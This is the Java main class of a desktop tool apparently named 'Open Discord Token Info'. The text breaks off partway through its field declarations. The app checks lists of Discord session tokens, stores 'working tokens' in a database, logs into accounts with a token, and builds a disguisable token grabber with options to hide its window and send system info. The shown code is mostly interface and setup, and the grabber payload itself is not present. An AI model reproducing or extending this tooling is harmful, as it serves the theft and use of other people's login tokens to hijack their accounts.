package application;

import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.lang.reflect.Proxy;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.MalformedURLException;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.nio.charset.StandardCharsets;
import java.nio.file.FileSystemNotFoundException;
import java.nio.file.Paths;
import java.sql.Connection;
import java.sql.DatabaseMetaData;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.text.MessageFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.LinkedList;
import java.util.List;
import java.util.Optional;
import java.util.ResourceBundle;
import javax.script.ScriptContext;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import javax.script.ScriptException;
import javax.security.auth.login.LoginException;
import javax.swing.ImageIcon;
import javafx.application.Application;
import javafx.beans.value.ObservableValue;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.scene.Scene;
import javafx.scene.control.TableColumn;
import javafx.scene.control.TableView;
import javafx.stage.Stage;
import javafx.stage.WindowEvent;
import jdk.nashorn.internal.ir.WhileNode;
import jfxtras.styles.jmetro.FlatAlert;
import jfxtras.styles.jmetro.JMetro;
import jfxtras.styles.jmetro.Style;
import net.bytebuddy.dynamic.scaffold.MethodRegistry.Handler.ForAbstractMethod;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

import org.apache.commons.io.FileUtils;
import org.controlsfx.control.StatusBar;
import org.json.JSONException;
import org.json.JSONObject;

import com.mifmif.common.regex.Generex;
import com.registry.RegistryKey;
import com.registry.RegistryValue;
import com.sun.org.apache.bcel.internal.generic.IF_ACMPEQ;
import com.udojava.evalex.Expression;
import application.web.WebApp;
import de.codecentric.centerdevice.javafxsvg.SvgImageLoaderFactory;
import discordtokengrabber.Grabber;
import javafx.application.Platform;
import javafx.beans.value.ChangeListener;
import javafx.concurrent.Task;
import javafx.event.ActionEvent;
import javafx.event.EventHandler;
import javafx.fxml.FXML;
import javafx.fxml.FXMLLoader;
import javafx.fxml.Initializable;
import javafx.scene.Parent;
import javafx.scene.control.Alert;
import javafx.scene.control.Alert.AlertType;
import javafx.scene.control.Button;
import javafx.scene.control.ButtonType;
import javafx.scene.control.CheckBox;
import javafx.scene.control.Label;
import javafx.scene.control.ListView;
import javafx.scene.control.Menu;
import javafx.scene.control.MenuItem;
import javafx.scene.control.ProgressBar;
import javafx.scene.control.RadioButton;
import javafx.scene.control.Tab;
import javafx.scene.control.TabPane;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import javafx.scene.control.TitledPane;
import javafx.scene.control.cell.PropertyValueFactory;
import javafx.scene.image.Image;
import javafx.scene.image.ImageView;
import javafx.scene.layout.AnchorPane;
import javafx.stage.FileChooser;
import javafx.stage.Modality;

public class Main extends Application implements Initializable {
	// Version
	public static final String AppVer = "5.1.7";

	// Database
	public static String db_database = "jdbc:h2:~/tokendb"; // will changed on main()
	public static final String db_user = "dti";
	public static final String db_pass = "discordtokeninfo";
	public static String db_table = "TOKENS";

	// Other
	public static String loginstatus = "";

	// Update (do not edit)
	public static Boolean updateAvailiable = false;
	public static String updateVer = "0.0";
	public static String updateReleaseChannel = "unknown";

	// Production (set all to true)
	public static Boolean seto = true; // Release

	/*********************** -LOCALE- ***************************/
	public static String LANG_HEADER_GETTOKENINFO = "";
	public static String LANG_HEADER_TOKENLISTCHECKER = "";
	public static String LANG_HEADER_GETMYTOKEN = "";
	public static String LANG_HEADER_BUILDTOKENGRABBER = "";
	public static String LANG_HEADER_TOKENDB = "";
	public static String LANG_HEADER_FILE = "";
	public static String LANG_HEADER_SETTINGS = "";
	public static String LANG_HEADER_HELP = "";
	public static String LANG_BTN_GETTOKENINFO = "";
	public static String LANG_BTN_ADDTODATABASE = "";
	public static String LANG_BTN_LOGINTODISCORDWITHTHISTOKEN = "";
	public static String LANG_HEADER_TOKENSTOCHECK = "";
	public static String LANG_HEADER_WORKINGTOKENS = "";
	public static String LANG_BTN_CLEAR = "";
	public static String LANG_BTN_OPENFROMFILE = "";
	public static String LANG_BTN_CHECKTOKENS = "";
	public static String LANG_BTN_ABORT = "";
	public static String LANG_BTN_GETMYTOKENS = "";
	public static String LANG_BTN_BUILDTOKENGRABBER = "";
	public static String LANG_BTN_COPYSELECTED = "";
	public static String LANG_BTN_REFRESH = "";
	public static String LANG_BTN_SAVEALLTOKENSTODATABASE = "";
	public static String LANG_BTN_SAVEALLTOKENSTOFILE = "";
	public static String LANG_CB_IWILLNOTUSETOKENGRABBERFORILLEGAL = "";
	public static String LANG_BTN_TEST = "";
	public static String LANG_BTN_DELETE = "";
	public static String LANG_BTN_COPYTOKEN = "";
	public static String LANG_BTN_COPYUSERNAME = "";
	public static String LANG_BTN_COPYDCUSERID = "";
	public static String LANG_BTN_EXIT = "";
	public static String LANG_BTN_ABOUT = "";
	public static String LANG_CB_SHOWSUCCESSMSG = "";
	public static String LANG_CB_CUSTOMICON = "";
	public static String LANG_BTN_BROWSEFILE = "";
	public static String LANG_CB_SENDSYSINFO = "";
	public static String LANG_CB_HIDEGRABBERWINDOW = "";
	public static String LANG_HEADER_MSGONSUCCESS = "";
	public static String LANG_HEADER_CUSTOMICON = "";
	public static String LANG_HEADER_ADVOPTIONS = "";
	public static String LANG_BTN_LANGUAGE = "";
	public static String LANG_BTN_DATABASE = "";
	public static String LANG_BTN_DATABASERESET = "";
	public static String LANG_HEADER_OTHERTOOLS = "";
	public static String LANG_LBL_DISCORDCLIENTID = "";
	public static String LANG_BTN_CALCULATECREATIONDATE = "";
	public static String LANG_LBL_DISCORDACCOUNTCREATIONDATECALCULATORTITLE = "";

	public static JSONObject LANG_jsonObject = new JSONObject();

	public void LANGLOAD(String lang) throws IOException {
		Boolean foundlanguage = false;
		String json = "";

		switch (lang) {
		case "english":
			foundlanguage = true;
			json = org.apache.commons.io.IOUtils
					.toString(getClass().getResourceAsStream("/application/lang/english.json"), StandardCharsets.UTF_8);

			// code block
			break;
		case "german":
			foundlanguage = true;
			json = org.apache.commons.io.IOUtils
					.toString(getClass().getResourceAsStream("/application/lang/german.json"), StandardCharsets.UTF_8);
			// code block
			break;
		default:
			foundlanguage = false;
			// code block

		}

		if (foundlanguage) {

			System.out.println("Loading language...");

			try {
				JSONObject jsonObject = new JSONObject(json);

				// System.out.println(json);

				// Set vars
				LANG_HEADER_GETTOKENINFO = jsonObject.getString("LANG_HEADER_GETTOKENINFO");
				LANG_HEADER_TOKENLISTCHECKER = jsonObject.getString("LANG_HEADER_TOKENLISTCHECKER");
				LANG_HEADER_GETMYTOKEN = jsonObject.getString("LANG_HEADER_GETMYTOKEN");
				LANG_HEADER_BUILDTOKENGRABBER = jsonObject.getString("LANG_HEADER_BUILDTOKENGRABBER");
				LANG_HEADER_TOKENDB = jsonObject.getString("LANG_HEADER_TOKENDB");
				LANG_HEADER_FILE = jsonObject.getString("LANG_HEADER_FILE");
				LANG_HEADER_SETTINGS = jsonObject.getString("LANG_HEADER_SETTINGS");
				LANG_HEADER_HELP = jsonObject.getString("LANG_HEADER_HELP");
				LANG_BTN_GETTOKENINFO = jsonObject.getString("LANG_BTN_GETTOKENINFO");
				LANG_BTN_ADDTODATABASE = jsonObject.getString("LANG_BTN_ADDTODATABASE");
				LANG_BTN_LOGINTODISCORDWITHTHISTOKEN = jsonObject.getString("LANG_BTN_LOGINTODISCORDWITHTHISTOKEN");
				LANG_HEADER_TOKENSTOCHECK = jsonObject.getString("LANG_HEADER_TOKENSTOCHECK");
				LANG_HEADER_WORKINGTOKENS = jsonObject.getString("LANG_HEADER_WORKINGTOKENS");
				LANG_BTN_CLEAR = jsonObject.getString("LANG_BTN_CLEAR");
				LANG_BTN_OPENFROMFILE = jsonObject.getString("LANG_BTN_OPENFROMFILE");
				LANG_BTN_CHECKTOKENS = jsonObject.getString("LANG_BTN_CHECKTOKENS");
				LANG_BTN_ABORT = jsonObject.getString("LANG_BTN_ABORT");
				LANG_BTN_GETMYTOKENS = jsonObject.getString("LANG_BTN_GETMYTOKENS");
				LANG_BTN_BUILDTOKENGRABBER = jsonObject.getString("LANG_BTN_BUILDTOKENGRABBER");
				LANG_BTN_COPYSELECTED = jsonObject.getString("LANG_BTN_COPYSELECTED");
				LANG_BTN_REFRESH = jsonObject.getString("LANG_BTN_REFRESH");
				LANG_BTN_SAVEALLTOKENSTODATABASE = jsonObject.getString("LANG_BTN_SAVEALLTOKENSTODATABASE");
				LANG_BTN_SAVEALLTOKENSTOFILE = jsonObject.getString("LANG_BTN_SAVEALLTOKENSTOFILE");
				LANG_CB_IWILLNOTUSETOKENGRABBERFORILLEGAL = jsonObject
						.getString("LANG_CB_IWILLNOTUSETOKENGRABBERFORILLEGAL");
				LANG_BTN_TEST = jsonObject.getString("LANG_BTN_TEST");
				LANG_BTN_DELETE = jsonObject.getString("LANG_BTN_DELETE");
				LANG_BTN_COPYTOKEN = jsonObject.getString("LANG_BTN_COPYTOKEN");
				LANG_BTN_COPYUSERNAME = jsonObject.getString("LANG_BTN_COPYUSERNAME");
				LANG_BTN_COPYDCUSERID = jsonObject.getString("LANG_BTN_COPYDCUSERID");
				LANG_BTN_EXIT = jsonObject.getString("LANG_BTN_EXIT");
				LANG_BTN_ABOUT = jsonObject.getString("LANG_BTN_ABOUT");
				LANG_CB_SHOWSUCCESSMSG = jsonObject.getString("LANG_CB_SHOWSUCCESSMSG");
				LANG_CB_CUSTOMICON = jsonObject.getString("LANG_CB_CUSTOMICON");
				LANG_BTN_BROWSEFILE = jsonObject.getString("LANG_BTN_BROWSEFILE");
				LANG_CB_SENDSYSINFO = jsonObject.getString("LANG_CB_SENDSYSINFO");
				LANG_CB_HIDEGRABBERWINDOW = jsonObject.getString("LANG_CB_HIDEGRABBERWINDOW");
				LANG_HEADER_MSGONSUCCESS = jsonObject.getString("LANG_HEADER_MSGONSUCCESS");
				LANG_HEADER_CUSTOMICON = jsonObject.getString("LANG_HEADER_CUSTOMICON");
				LANG_HEADER_ADVOPTIONS = jsonObject.getString("LANG_HEADER_ADVOPTIONS");
				LANG_BTN_LANGUAGE = jsonObject.getString("LANG_BTN_LANGUAGE");
				LANG_BTN_DATABASE = jsonObject.getString("LANG_BTN_DATABASE");
				LANG_BTN_DATABASERESET = jsonObject.getString("LANG_BTN_DATABASERESET");

				LANG_HEADER_OTHERTOOLS = jsonObject.getString("LANG_HEADER_OTHERTOOLS");
				LANG_LBL_DISCORDCLIENTID = jsonObject.getString("LANG_LBL_DISCORDCLIENTID");
				LANG_BTN_CALCULATECREATIONDATE = jsonObject.getString("LANG_BTN_CALCULATECREATIONDATE");
				LANG_LBL_DISCORDACCOUNTCREATIONDATECALCULATORTITLE = jsonObject.getString("LANG_LBL_DISCORDACCOUNTCREATIONDATECALCULATORTITLE");
				// Set controls
				Platform.runLater(() -> {
					// Menu
					menfile.setText(LANG_HEADER_FILE);
					mensettings.setText(LANG_HEADER_SETTINGS);
					menhelp.setText(LANG_HEADER_HELP);

					// Buttons
					btngettokeninfo.setText(LANG_BTN_GETTOKENINFO);
					btntokeninfologin.setText(LANG_BTN_LOGINTODISCORDWITHTHISTOKEN);
					btnaddtokentodb.setText(LANG_BTN_ADDTODATABASE);
					btntokenstocheckopenfromfile.setText(LANG_BTN_OPENFROMFILE);
					btntokenstocheckclear.setText(LANG_BTN_CLEAR);
					btnabortchecktokens.setText(LANG_BTN_ABORT);
					btnchecktokens.setText(LANG_BTN_CHECKTOKENS);
					btngettokeninfoselectedtoken.setText(LANG_BTN_GETTOKENINFO);
					btngetyourtokencopyselected.setText(LANG_BTN_COPYSELECTED);
					btngetmytoken.setText(LANG_BTN_GETMYTOKENS);
					btnbuildgrabber.setText(LANG_BTN_BUILDTOKENGRABBER);
					btntokendbrefresh.setText(LANG_BTN_REFRESH);
					btnworkingtokenssavetofile.setText(LANG_BTN_SAVEALLTOKENSTOFILE);
					btntokenlistcheckertokensaveindb.setText(LANG_BTN_SAVEALLTOKENSTODATABASE);
					btnworkingtokenscopyselected.setText(LANG_BTN_COPYSELECTED);
					btnworkingtokensgetinfo.setText(LANG_BTN_GETTOKENINFO);
					btnclearworkingtokens.setText(LANG_BTN_CLEAR);
					btntgiconbrowse.setText(LANG_BTN_BROWSEFILE);
					btntgmsgtest.setText(LANG_BTN_TEST);

					// Tab
					tabgettokeninfo.setText(LANG_HEADER_GETTOKENINFO);
					tabtokenlistchecker.setText(LANG_HEADER_TOKENLISTCHECKER);
					tabgetmytoken.setText(LANG_HEADER_GETMYTOKEN);
					tabbuildtokengrabber.setText(LANG_HEADER_BUILDTOKENGRABBER);
					tabtokendatabase.setText(LANG_HEADER_TOKENDB);
					tabothertools.setText(LANG_HEADER_OTHERTOOLS);
					tabtokenstocheck.setText(LANG_HEADER_TOKENSTOCHECK);
					tabworkingtokens.setText(LANG_HEADER_WORKINGTOKENS);

					// tpadvoptions.setText(LANG_HEADER_ADVOPTIONS);
					tpcustomicon.setText(LANG_HEADER_CUSTOMICON);
					tpmessageonsuccess.setText(LANG_HEADER_MSGONSUCCESS);

					// TokenDB Context-Menu
					tvdbtokenscmgettokeninfo.setText(LANG_BTN_GETTOKENINFO);
					tvdbtokenscmcpusername.setText(LANG_BTN_COPYUSERNAME);
					tvdbtokenscmcptoken.setText(LANG_BTN_COPYTOKEN);
					tvdbtokenscmcpdcuserid.setText(LANG_BTN_COPYDCUSERID);
					tvdbtokenscm.setText(LANG_BTN_DELETE);

					// Other
					cbtgdisclaimer.setText(LANG_CB_IWILLNOTUSETOKENGRABBERFORILLEGAL);
					cbtgshowsuccessmsg.setText(LANG_CB_SHOWSUCCESSMSG);
					cbtgaddicon.setText(LANG_CB_CUSTOMICON);
					cbtgsemdsysteminfo.setText(LANG_CB_SENDSYSINFO);
					cbtghidewindow.setText(LANG_CB_HIDEGRABBERWINDOW);

					// Menu
					menexit.setText(LANG_BTN_EXIT);
					menabout.setText(LANG_BTN_ABOUT);

					mendatabasereset.setText(LANG_BTN_DATABASERESET);
					menlanguage.setText(LANG_BTN_LANGUAGE);
					mendatabase.setText(LANG_BTN_DATABASE);
					
					
					//Label
					lbldiscordacccreationdatecalculator.setText(LANG_LBL_DISCORDACCOUNTCREATIONDATECALCULATORTITLE);
					lbldiscordclientid.setText(LANG_LBL_DISCORDCLIENTID);
					btnotclidcalc.setText(LANG_BTN_CALCULATECREATIONDATE);
				});

			} catch (JSONException err) {
				err.printStackTrace();
			}

		} else {
			Platform.runLater(() -> {
				Alert alert = new Alert(AlertType.ERROR);
				alert.setTitle("Cannot load language");
				alert.setHeaderText("Cannot load language");
				alert.setContentText("Language \"" + lang + "\" not found");
				alert.showAndWait();
			});
		}

	}

	/********************* -LOCALE END- *************************/

	/**
	 * Initializes the controller class.
	 *
	 * @param url
	 * @param rb
	 */
	@Override
	public void initialize(URL url, ResourceBundle rb) {

		try {
			System.out.println("Apply language...");
			LANGLOAD("english");
		} catch (Exception e) {
			// TODO: handle exception
			e.printStackTrace();
		}

		System.out.println("Initializing Database...");
		panetokeninfodetails.setVisible(false);
		db_init();
		db_view();

		// Icons Buttons
		int ctbtn_height = 16;
		int ctbtn_width = 16;
		btngettokeninfo.setGraphic(resizeImageAsImageView(getClass().getResourceAsStream("/application/icons/run.svg"),
				ctbtn_width, ctbtn_height));
		btntokenstocheckopenfromfile.setGraphic(resizeImageAsImageView(
				getClass().getResourceAsStream("/application/icons/folder.svg"), ctbtn_width, ctbtn_height));
		btnchecktokens.setGraphic(resizeImageAsImageView(getClass().getResourceAsStream("/application/icons/check.svg"),
				ctbtn_width, ctbtn_height));
		btnworkingtokenssavetofile.setGraphic(resizeImageAsImageView(
				getClass().getResourceAsStream("/application/icons/save.svg"), ctbtn_width, ctbtn_height));
		btntokenlistcheckertokensaveindb.setGraphic(resizeImageAsImageView(
				getClass().getResourceAsStream("/application/icons/database.svg"), ctbtn_width, ctbtn_height));
		btnworkingtokenscopyselected.setGraphic(resizeImageAsImageView(
				getClass().getResourceAsStream("/application/icons/copy.svg"), ctbtn_width, ctbtn_height));
		btnworkingtokensgetinfo.setGraphic(resizeImageAsImageView(
				getClass().getResourceAsStream("/application/icons/info.svg"), ctbtn_width, ctbtn_height));
		btnclearworkingtokens.setGraphic(resizeImageAsImageView(
				getClass().getResourceAsStream("/application/icons/clean.svg"), ctbtn_width, ctbtn_height));
		btntokenstocheckclear.setGraphic(resizeImageAsImageView(
				getClass().getResourceAsStream("/application/icons/clean.svg"), ctbtn_width, ctbtn_height));
		btnabortchecktokens.setGraphic(resizeImageAsImageView(
				getClass().getResourceAsStream("/application/icons/abort.svg"), ctbtn_width, ctbtn_height));
		btntokendbrefresh.setGraphic(resizeImageAsImageView(
				getClass().getResourceAsStream("/application/icons/refresh.svg"), ctbtn_width, ctbtn_height));
		tvdbtokenscmcpusername.setGraphic(resizeImageAsImageView(
				getClass().getResourceAsStream("/application/icons/copy.svg"), ctbtn_width, ctbtn_height));
		tvdbtokenscmcptoken.setGraphic(resizeImageAsImageView(
				getClass().getResourceAsStream("/application/icons/copy.svg"), ctbtn_width, ctbtn_height));
		tvdbtokenscmcpdcuserid.setGraphic(resizeImageAsImageView(
				getClass().getResourceAsStream("/application/icons/copy.svg"), ctbtn_width, ctbtn_height));
		tvdbtokenscmgettokeninfo.setGraphic(resizeImageAsImageView(
				getClass().getResourceAsStream("/application/icons/info.svg"), ctbtn_width, ctbtn_height));
		tvdbtokenscm.setGraphic(resizeImageAsImageView(getClass().getResourceAsStream("/application/icons/delete.svg"),
				ctbtn_width, ctbtn_height));
		btngettokeninfoselectedtoken.setGraphic(resizeImageAsImageView(
				getClass().getResourceAsStream("/application/icons/info.svg"), ctbtn_width, ctbtn_height));
		btngetyourtokencopyselected.setGraphic(resizeImageAsImageView(
				getClass().getResourceAsStream("/application/icons/copy.svg"), ctbtn_width, ctbtn_height));
		btngetmytoken.setGraphic(resizeImageAsImageView(getClass().getResourceAsStream("/application/icons/search.svg"),
				ctbtn_width, ctbtn_height));
		btnbuildgrabber.setGraphic(resizeImageAsImageView(
				getClass().getResourceAsStream("/application/icons/rocket.svg"), ctbtn_width, ctbtn_height));
		btntgiconbrowse.setGraphic(resizeImageAsImageView(
				getClass().getResourceAsStream("/application/icons/folder.svg"), ctbtn_width, ctbtn_height));
		btntgmsgtest.setGraphic(resizeImageAsImageView(getClass().getResourceAsStream("/application/icons/test.svg"),
				ctbtn_width, ctbtn_height));
		btnaddtokentodb.setGraphic(resizeImageAsImageView(getClass().getResourceAsStream("/application/icons/add.svg"),
				ctbtn_width, ctbtn_height));
		btntokeninfologin.setGraphic(resizeImageAsImageView(
				getClass().getResourceAsStream("/application/icons/login.svg"), ctbtn_width, ctbtn_height));
		btnotclidcalc.setGraphic(resizeImageAsImageView(
				getClass().getResourceAsStream("/application/icons/calculator.svg"), ctbtn_width, ctbtn_height));

		// Icons Tabs
		int tabicon_height = 16;
		int tabicon_width = 16;
		tabgettokeninfo.setGraphic(resizeImageAsImageView(getClass().getResourceAsStream("/application/icons/info.svg"),
				tabicon_width, tabicon_height));
		tabtokenlistchecker.setGraphic(resizeImageAsImageView(
				getClass().getResourceAsStream("/application/icons/check.svg"), tabicon_width, tabicon_height));
		tabgetmytoken.setGraphic(resizeImageAsImageView(getClass().getResourceAsStream("/application/icons/search.svg"),
				tabicon_width, tabicon_height));
		tabbuildtokengrabber.setGraphic(resizeImageAsImageView(
				getClass().getResourceAsStream("/application/icons/rocket.svg"), tabicon_width, tabicon_height));
		tabtokendatabase.setGraphic(resizeImageAsImageView(
				getClass().getResourceAsStream("/application/icons/database.svg"), tabicon_width, tabicon_height));
		tabothertools.setGraphic(resizeImageAsImageView(getClass().getResourceAsStream("/application/icons/wrench.svg"),
				tabicon_width, tabicon_height));
		tabworkingtokens.setGraphic(resizeImageAsImageView(
				getClass().getResourceAsStream("/application/icons/checkmark.svg"), tabicon_width, tabicon_height));
		tabtokenstocheck.setGraphic(resizeImageAsImageView(
				getClass().getResourceAsStream("/application/icons/checklist.svg"), tabicon_width, tabicon_height));

		// Icons Menu
		int menuicon_height = 16;
		int menuicon_width = 16;
		menexit.setGraphic(resizeImageAsImageView(getClass().getResourceAsStream("/application/icons/exit.svg"),
				menuicon_width, menuicon_height));
		menlanguage.setGraphic(resizeImageAsImageView(getClass().getResourceAsStream("/application/icons/language.svg"),
				menuicon_width, menuicon_height));
		mendatabase.setGraphic(resizeImageAsImageView(getClass().getResourceAsStream("/application/icons/database.svg"),
				menuicon_width, menuicon_height));
		menlanggerman.setGraphic(
				resizeImageAsImageView(getClass().getResourceAsStream("/application/icons/flag_germany.svg"),
						menuicon_width, menuicon_height));
		menlangenglish.setGraphic(resizeImageAsImageView(
				getClass().getResourceAsStream("/application/icons/flag_usa.svg"), menuicon_width, menuicon_height));
		menabout.setGraphic(resizeImageAsImageView(getClass().getResourceAsStream("/application/icons/about.svg"),
				menuicon_width, menuicon_height));
		mendatabasereset.setGraphic(resizeImageAsImageView(
				getClass().getResourceAsStream("/application/icons/reset.svg"), menuicon_width, menuicon_height));

		// Event Listeners

		lvtokensfound.getSelectionModel().selectedItemProperty().addListener(new ChangeListener<String>() {

			@Override
			public void changed(ObservableValue<? extends String> observable, String oldValue, String newValue) {
				// Your action here
				// System.out.println("Selected item: " + newValue);
				btngettokeninfoselectedtoken.setDisable(false);
				btngetyourtokencopyselected.setDisable(false);
			}
		});

		lvworkingtokens.getSelectionModel().selectedItemProperty().addListener(new ChangeListener<String>() {

			@Override
			public void changed(ObservableValue<? extends String> observable, String oldValue, String newValue) {
				// Your action here
				// System.out.println("Selected item: " + newValue);
				btnworkingtokenscopyselected.setDisable(false);
				btnworkingtokensgetinfo.setDisable(false);
			}
		});

		if (simpleutils.OperatingSystem.getOS() == simpleutils.OperatingSystem.OS.MAC) {
			Alert alert = new Alert(AlertType.ERROR);
			alert.setTitle("Operating System not supported");
			alert.setHeaderText("Operating System not supported");
			alert.setContentText("MacOS is currently not supported. Open Discord Token Info will now exit.");
			alert.showAndWait();
			System.exit(0);
		}

		if (simpleutils.OperatingSystem.getOS() == simpleutils.OperatingSystem.OS.SOLARIS) {
			Alert alert = new Alert(AlertType.ERROR);
			alert.setTitle("Operating System not supported");
			alert.setHeaderText("Operating System not supported");
			alert.setContentText("Solaris is currently not supported. Open Discord Token Info will now exit.");
			alert.showAndWait();
			System.exit(0);
		}

		if (!seto && !suppresssetomsg) {
			Alert alert = new Alert(AlertType.ERROR);
			alert.setTitle("Development build");
			alert.setHeaderText("Development build");
			alert.setContentText("This is a development build. Be careful, it could kill your pets.");
			alert.showAndWait();

		}

	}

	public static String startupdir() {

		return System.getProperty("user.dir");

	}

	public static Boolean suppresssetomsg = false;

	public static Boolean CanConnectTo(String url) {
		try {
			URL url1 = new URL(url);
			URLConnection connection = url1.openConnection();
			connection.connect();
			return true;
		} catch (MalformedURLException e) {
			return false;
		} catch (IOException e) {
			return false;
		}
	}

	static Boolean guienabled = true;
	static String[] appargs = {};

	public static ImageView resizeImageAsImageView(InputStream input, int scaledWidth, int scaledHeight) {

		try {
			ImageView iv = new ImageView();
			Image image = new Image(input);
			iv.setImage(image);
			iv.setFitHeight(scaledHeight);
			iv.setFitWidth(scaledWidth);
			return iv;

		} catch (Exception ex) {
			ex.printStackTrace();
			return null;
		}

	}

	public static void main(String[] args) throws Exception {
		appargs = args;
		Boolean exitaftercmds = false;

		SvgImageLoaderFactory.install();

		db_database = "jdbc:h2:" + startupdir() + File.separator + ".." + File.separator + "tokendb";

		theme = "system";

		for (String arg : args) {

			if (arg.equals("--nogui")) {
				guienabled = false;
			}

			if (arg.equals("--gui-theme-light")) {
				theme = "light";
			}

			if (arg.equals("--gui-theme-dark")) {
				theme = "dark";
			}
			if (arg.equals("--gui-theme-system")) {
				theme = "system";
			}
			if (arg.equals("--suppress-seto-msg")) {
				suppresssetomsg = true;
			}
			if (arg.equals("--dtiversion")) {
				exitaftercmds = true;
				System.out.print(AppVer);
			}

		}

		if (exitaftercmds) {
			System.exit(0);
		} else {

			System.out.println("Startup directory is " + startupdir());
			System.out.print("Loading H2 Driver...");
			try {
				Class.forName("org.h2.Driver");
				System.out.print(" Success\n");
			} catch (ClassNotFoundException e) {
				// TODO Auto-generated catch block
				System.out.print(" Failed\n");
				// e.printStackTrace();
			}
			System.out.print("Loading SQLite Driver...");
			try {
				Class.forName("org.sqlite.JDBC");
				System.out.print(" Success\n");
			} catch (ClassNotFoundException e) {
				// TODO Auto-generated catch block
				System.out.print(" Failed\n");
				// e.printStackTrace();
			}

			// ConnectionCheck() -> wenn erfolgreich ruft StartupContinue() auf

			ConnectionCheck();

		}

	}

	public static void StartupContinue() throws Exception {
		for (String arg : appargs) {

			if (arg.equals("--httpd")) {
				int port = 54678;
				System.out.println("Starting Web Server on Port " + port + "...");
				WebAppStart(port);

			}

			if (arg.equals("--cli")) {

				Cli.start();
				System.exit(0);
			}

			if (arg.equals("--ivefoundaneasteregg")) {
				EasterEgg ee = new EasterEgg();
				ee.exec();

			}

		}

		if (guienabled) {
			System.out.println("Starting GUI...");
			launch(appargs);
		}

	}

	public static int connchecksecs = 5;

	public static void ConnectionCheck() throws Exception {

		System.out.print("Checking connection to discord.com...");
		Boolean canconnecttodiscord = false;

		canconnecttodiscord = CanConnectTo("https://discord.com");

		if (canconnecttodiscord) {

			System.out.print(" success\n");

			StartupContinue();
		} else {

			System.out.print(" failed. Retrying in " + connchecksecs + " seconds... Hit CTRL+C to abort");

			try {
				Thread.sleep(5 * 1000);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			System.out.println("");
			ConnectionCheck();

		}

	}

	static WebApp waa = null;

	public static void WebAppStart(int port) {
		try {
			waa = new WebApp(port);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	static String theme = "";
	Scene scene = null;
	JMetro jMetro = null;
	static Style jMetroStyle = null;

	@Override
	public void start(Stage stage) throws IOException {

		FXMLLoader loader = new FXMLLoader(getClass().getResource("/application/dti_main.fxml"));
		Parent root = loader.load();
		scene = new Scene(root);

		stage.setOnCloseRequest(new EventHandler<WindowEvent>() {
			@Override
			public void handle(WindowEvent e) {
				System.out.println("Goodbye!");
				Platform.exit();
				System.exit(0);
			}
		});

		jMetroStyle = Style.LIGHT;
		if (theme.equals("light")) {
			jMetroStyle = Style.LIGHT;
		}
		if (theme.equals("dark")) {
			jMetroStyle = Style.DARK;
		}

		if (theme.equals("system")) {

			if (simpleutils.OperatingSystem.getOS() == simpleutils.OperatingSystem.OS.WINDOWS) {

				RegistryKey windowsPersonalizeKey = new RegistryKey(
						"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize");
				RegistryValue appsUsesLightThemeValue = windowsPersonalizeKey.getValue("AppsUseLightTheme");

				if (appsUsesLightThemeValue != null) {
					// this value is available

					// getting the actual value
					byte[] data = appsUsesLightThemeValue.getByteData();
					byte actualValue = data[0];
					boolean windows10Dark = actualValue == 0;

					if (windows10Dark) {
						// the theme is dark
						jMetroStyle = Style.DARK;

					} else {
						// the theme is light
						jMetroStyle = Style.LIGHT;
					}

				}

			} else {
				jMetroStyle = Style.LIGHT;
			}

		}

		jMetro = new JMetro(jMetroStyle);

		jMetro.setScene(scene);

		String titleString = "Open Discord Token Info";

		stage.getIcons().add(new Image("/application/opendti.png"));
		stage.setTitle(titleString);

		stage.setResizable(true);

		stage.setScene(scene);
		stage.show();

	}

	@FXML
	private MenuItem menexit;

	@FXML
	private MenuItem menabout;

	@FXML
	private TabPane tabpanemain;

	@FXML
	private TextField txttoken;

	@FXML
	private Button btngettokeninfo;

	@FXML
	private ProgressBar progbarloading;

	@FXML
	private AnchorPane panetokeninfodetails;

	@FXML
	private Label lblusername;

	@FXML
	private Label lbllocale;

	@FXML
	private Label lblid;

	@FXML
	private Label lbltoken;

	@FXML
	private Label lblphone;

	@FXML
	private Label lblemail;

	@FXML
	private Label lblverified;

	@FXML
	private Label lblacccreated;

	@FXML
	private Label lblpublicflag;

	@FXML
	private Label lblphone131;

	@FXML
	private TextArea txtbio;

	@FXML
	private Label lblnitro;

	@FXML
	private Label lblnsfwallowed;

	@FXML
	private Label lblmfaenabled;

	@FXML
	private ImageView imguseravatar;

	@FXML
	private Button btntokeninfologin;

	@FXML
	private Button btnaddtokentodb;

	@FXML
	private Button btnchecktokens;

	@FXML
	private TextArea txttokenstocheck;

	@FXML
	private Button btntokenstocheckclear;

	@FXML
	private StatusBar statusbartokenschecked;

	@FXML
	private Button btnabortchecktokens;

	@FXML
	private Button btntokenstocheckopenfromfile;

	@FXML
	private ListView<String> lvworkingtokens;

	@FXML
	private Button btnclearworkingtokens;

	@FXML
	private Button btnworkingtokenssavetofile;

	@FXML
	private Button btnworkingtokenscopyselected;

	@FXML
	private Button btnworkingtokensgetinfo;

	@FXML
	private ListView<String> lvtokensfound;

	@FXML
	private Button btngetmytoken;

	@FXML
	private Button btngettokeninfoselectedtoken;

	@FXML
	private Button btngetyourtokencopyselected;

	@FXML
	private TableView<DiscordToken> tvdbtokens;

	@FXML
	private MenuItem mendatabasereset;

	@FXML
	private MenuItem tvdbtokenscmcpusername;

	@FXML
	private MenuItem tvdbtokenscmcptoken;

	@FXML
	private MenuItem tvdbtokenscmcpdcuserid;

	@FXML
	private MenuItem tvdbtokenscmgettokeninfo;

	@FXML
	private MenuItem tvdbtokenscm;

	@FXML
	private Button btntokenlistcheckertokensaveindb;

	@FXML
	private Button btntokendbrefresh;

	@FXML
